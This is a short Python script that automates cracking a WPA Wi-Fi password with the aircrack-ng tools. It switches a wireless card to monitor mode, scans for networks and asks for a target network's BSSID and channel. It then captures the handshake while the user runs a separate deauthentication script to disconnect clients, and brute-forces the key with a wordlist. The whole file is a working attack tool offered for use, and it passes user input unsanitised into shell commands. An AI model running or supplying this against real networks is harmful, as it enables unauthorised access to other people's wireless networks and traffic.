from os import system
from time import sleep
import csv


# asks for wireless card to apply monitor mode on it
wireless_card = input("Enter your wireless card: ")

# turns wireless card into monitor mod
mon0 = 'ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up'.format(wireless_card)
system(mon0)

file_name = input("Enter the CSV file name: ")

# runs a scan with airodump-ng to get available wifi
airodump = 'timeout 10s airodump-ng -w '+file_name+' --output-format csv '+wireless_card
system(airodump)

with open(file_name+'-01.csv', 'rb') as csvfile:
    wifireader = csv.reader(csvfile, delimiter=' ', quotechar='|')
    for row in wifireader:
        print(', '.join(row))


# asks for your target's bssid
bssid = input("Enter the BSSID of the network you want to crack: ")

# asks for your target's channel
channel = input("Enter the channel number that the wireless network is currently running on: ")
save = input("Where should i save the captured handshake? ")
print ("..."),
print ("Airodump will start, in the meanwhile, run deauth.py in a new terminal")
sleep(5)

# starts airodump-ng on a network to capture handshakes and open new xterm to deauth connected devices
airodump2 = 'airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(channel, bssid, save, wireless_card)
system(airodump2)
print("Handshake is captured")
print("Cracking the handshake with aircrack-ng is starting...")

# 'Aircrack-ng' parameters set
wordlist = input("Specify the path to your wordlist dictionary: ")
save2 = input("Enter the .cap file name that is saved in the directory you previously entered: e.g: 01.cap")
print ("This could take a while according to the wordlist you are using, so be patient!")
crack = 'aircrack-ng -a 2 {0}{1} -w {2} '.format(save, save2, wordlist)
system(crack)